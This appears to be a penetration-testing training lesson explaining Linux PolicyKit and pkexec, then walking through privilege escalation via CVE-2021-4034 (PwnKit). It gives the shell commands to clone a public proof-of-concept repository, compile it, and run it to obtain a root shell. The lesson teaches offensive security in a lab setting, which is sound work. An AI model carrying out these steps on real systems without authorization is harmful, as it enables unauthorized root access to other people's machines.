PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. It's possible to set how permissions are granted by default. For example it can be set if the operation for each user should be allowed or forbidden for each user, with which privileges, and for how long (one-time, process-limited, session-limited, or unlimited validity). The authorizations can be assigned individually for each user and group.

Polkit works with two groups of files.

1. actions/policies (`/usr/share/polkit-1/actions`)
2. rules (`/usr/share/polkit-1/rules.d`)

Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

PolKit also comes with three additional programs:

- `pkexec` - runs a program with the rights of another user or with root rights
- `pkaction` - can be used to display actions
- `pkcheck` - this can be used to check if a process is authorized for a specific action

The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.
```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.

To exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.
```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Once we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.
```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```
